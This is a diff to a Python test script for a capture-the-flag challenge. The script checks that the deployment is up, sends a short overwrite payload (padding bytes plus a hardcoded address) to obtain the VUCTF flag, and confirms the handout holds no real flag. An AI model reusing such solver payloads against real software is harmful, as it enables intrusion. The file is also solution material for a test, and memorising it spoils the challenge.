@@ -21,7 +21,7 @@ def run_test(flag, connection_string=None, handout_path=None, deployment_path=No
     if (res == 0):
         sock.close()
         p = remote(host, int(port))
-        if "CHAR TO INCREMENT:" in p.recvline().decode('ascii'):
+        if "CHAR TO INCREMENT:" in p.recv(20).decode('ascii'):
             result["DEPLOYMENT_WORKING"] = ""
         else:
             result["DEPLOYMENT_WORKING"] = "Challenge greeting missing"
@@ -37,7 +37,8 @@ def run_test(flag, connection_string=None, handout_path=None, deployment_path=No
         # match = re.search(r"Win @ (0x[0-9a-fA-F]+)", p.recvline().decode("ascii"))
         # ABBBB\xFF\x0F\x04\x08
         p.sendline(b'\x41' + b'\x42'*4 + b'\xFF\x0F\x04\x08')
-        output = p.recvall()
+        newline = p.recvline()
+        output = p.recvline()
         matches = re.findall( r"VUCTF\{.*?\}", output.decode("ascii"))
         if flag.encode() in output:
             result["FLAG_CORRECT"] = ""
@@ -56,7 +57,7 @@ def run_test(flag, connection_string=None, handout_path=None, deployment_path=No
 
 
     # Assert that all credentials/flags in the handout files are invalid (DUMMY_SECRET)
-    result["DUMMY_SECRET"] = grep_recursive("VUCTF{", handout_path)
+    result["DUMMY_SECRET"] = '' if flag not in grep_recursive("VUCTF{", handout_path) else "Flag in handout"
 
     return result
 
